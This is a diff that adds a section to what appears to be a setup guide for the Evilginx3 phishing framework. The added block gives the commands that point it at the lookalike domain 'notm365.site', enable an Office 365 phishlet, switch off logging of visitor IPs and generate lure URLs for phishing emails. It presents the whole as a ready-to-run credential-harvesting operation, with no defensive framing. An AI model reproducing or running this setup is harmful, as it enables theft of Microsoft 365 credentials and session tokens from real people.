@@ -60,3 +60,29 @@ systemctl stop systemd-resolved
 /root/evilginx3/build/evilginx -p /root/phishlets/
 ```
 
+## Ready to become a hacker?
+
+```
+# Time to configure your software
+config domain notm365.site
+
+config ipv4 external <your public ip>
+
+# Now let's setup our phishlets
+
+phishlets hostname o365 notm365.site
+
+phishlets enable o365
+
+# This will turn off that log so you're not constantly seeing random IPs hit your server!
+
+blacklist log off   # This will shut off logs
+
+# Time to create our Lures (basically, these are the URLs we'll include in our phishing emails
+
+lures create o365
+
+lures get-url 0
+```
+
+## Now that you have setup your server you're ready to go!!
